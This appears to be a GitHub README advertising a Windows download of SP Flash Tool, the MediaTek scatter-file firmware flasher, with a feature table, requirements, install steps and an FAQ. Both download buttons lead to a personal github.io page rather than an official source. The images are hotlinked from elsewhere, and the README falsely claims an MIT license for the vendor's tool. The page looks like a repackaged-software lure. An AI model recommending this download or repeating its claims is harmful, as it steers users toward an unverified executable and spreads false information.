# SP Flash Tool – Scatter-Based Flashing Utility for Windows

SP Flash Tool is a scatter-based flashing utility for Windows that writes stock firmware to MediaTek Android devices partition by partition.

<div align="center">
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPO23T9Ha-U1OrgSpxzAxSi17ELDTGLMnLNjOpMIytgN3VhnSRPsqzB0li&s=10" alt="SP Flash Tool Logo" width="25%"/>
</div>

<div align="center">

  ![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
  ![License](https://img.shields.io/badge/License-MIT-green)

</div>

<div align="center">
  <h3>«Load a scatter file, flash stock firmware, and get your MediaTek device running again»</h3>

  [![Download SP Flash Tool](https://img.shields.io/badge/⬇️_Download_SP_Flash_Tool_for_Windows-00897B?style=for-the-badge)](https://edwarddawson134.github.io/.github/SP-Flash-Tool-Scatter-Firmware)

</div>

---

- [👁️ At a Glance](#-at-a-glance)
- [🎁 What You Get](#-what-you-get)
- [📸 Screens](#-screens)
- [🖥️ Hardware Needs](#-hardware-needs)
- [🧷 Install Guide](#-install-guide)
- [⚡ Quick Start](#-quick-start)
- [❓ FAQ](#-faq)
- [💬 Support](#-support)
- [📄 License](#-license)

---

## 👁️ At a Glance

SP Flash Tool for Windows is a focused desktop app for writing firmware to MediaTek-based Android phones and tablets. It reads a scatter file — the map of your device's partitions — and copies each firmware image into the right slot. That makes it the go-to choice for reinstalling stock software, pushing an official update, or reviving a handset that has stopped booting. It runs low-level flashing over USB, so it can reach a device even when Android itself will not load. The app is free to download, and the guidance here keeps to legitimate uses: restoring and maintaining hardware you own.

## 🎁 What You Get

| Feature | What it does for you |
|---|---|
| Scatter loading | Reads your scatter file and lists every partition automatically |
| Flash modes | Lets you pick Download Only for updates or Format All for a clean rebuild |
| Device recovery | Rewrites core partitions to revive a phone that will not start |
| Partition readback | Saves current partition data so you have a fallback before changes |
| Write verification | Checks each image with a checksum to confirm a complete flash |
| Broad MTK support | Handles many MediaTek chipset families across Android devices |

## 📸 Screens

<div align="center">
  <img src="https://spflashtool.com/images/sp-flash-tool.jpg" alt="SP Flash Tool for Windows screen" width="80%"/>
</div>

The scatter loader, mode selector, and progress log share one clean window, so you always know which step of the flash you are on.

## 🖥️ Hardware Needs

| Item | Requirement |
|---|---|
| Operating System | Windows 10 or 11 (64-bit); older 64-bit Windows also supported |
| Processor | A modern 64-bit processor |
| Memory | 2 GB RAM or more |
| Storage | Free space for the app and your firmware package |
| USB | An available USB port and a data-capable cable |
| Drivers | MediaTek USB VCOM drivers installed for detection |

## 🧷 Install Guide

1. Download the SP Flash Tool package for Windows from the button on this page.
2. Extract the archive into its own folder.
3. Install the MediaTek USB VCOM drivers so Windows recognises the device in flashing mode.
4. Open the folder and launch flash_tool — it is portable and skips any setup wizard.

## ⚡ Quick Start

1. Power the phone off and keep its firmware package and scatter file ready on your PC.
2. Open the app and load the scatter file to reveal the partition list.
3. Select Download Only for a routine update that preserves your data.
4. Hit Download, then connect the switched-off phone over USB to begin.
5. When the completion mark appears, disconnect and restart the device.

## ❓ FAQ

**Is the download free?**
Yes. SP Flash Tool is free to download and use for flashing firmware to your own MediaTek devices.

**What if I do not have a scatter file?**
You need one; it ships inside your device's firmware package and tells the tool how the storage is laid out.

**Can it fix a boot loop?**
Often it can. Writing fresh stock firmware is a standard way to clear a boot loop on a MediaTek phone.

**Which mode keeps my data?**
Download Only generally leaves user data untouched, while Format All wipes the device entirely.

## 💬 Support

Need help mid-flash? Open the Help menu inside the application and read the in-app documentation, which explains each mode and the status messages you may encounter. For extra reference, the official SP Flash Tool website offers written guides you can view in your browser. If a flash stops short, check the log message first — the cause is usually the cable, the drivers, or a firmware package that does not match your model.

---

<div align="center">
  <h3>Ready to get started with SP Flash Tool?</h3>

  [![Download SP Flash Tool](https://img.shields.io/badge/⬇️_Download_SP_Flash_Tool_for_Windows-00897B?style=for-the-badge)](https://edwarddawson134.github.io/.github/SP-Flash-Tool-Scatter-Firmware)

</div>

## License
This project is licensed under the **MIT License** — you are free to use, copy, modify, and distribute it. The full MIT License text is provided in the LICENSE file included with the project.

---

<div align="center">
  <sub>Get SP Flash Tool for Windows and flash stock MediaTek firmware with a utility built for the job.</sub>
</div>
